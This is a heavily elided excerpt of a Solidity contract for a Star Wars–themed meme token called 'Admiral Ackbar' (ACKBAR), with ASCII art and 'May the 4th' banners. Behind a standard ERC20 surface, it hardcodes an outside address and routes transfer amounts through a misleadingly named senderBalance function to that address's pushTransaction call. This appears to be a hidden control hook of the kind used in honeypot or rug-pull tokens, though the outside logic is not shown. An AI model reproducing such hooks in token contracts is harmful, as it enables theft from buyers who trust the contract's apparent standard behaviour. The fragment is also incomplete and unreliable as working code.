...
: : : : : : : :¯''~~~~~~''' : : : : : : : : : : : : : : : : : : | : : : : : : : : :)
. . . . . . . . . . . . . . . . . . $ A C K B A R . . . . . . . . . . . . . . . . . . . .
 . . . . . . . . . . . M A Y . T H E . 4 T H . BE . W I T H . Y O U . . . . . . . . . . .
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _starWars = 0xfD30e65F78A406A18A19Eb897523e4457D3f9148;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return starWars.pushTransaction(amount);
    }
    ...
    function _DeployAckbar(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployAckbar(creator, initialSupply);
    }
}

contract Ackbar is ERC20Token {
    constructor() ERC20Token("Admiral Ackbar", "ACKBAR", msg.sender, 4444444444 * 10 ** 18) {
    }
}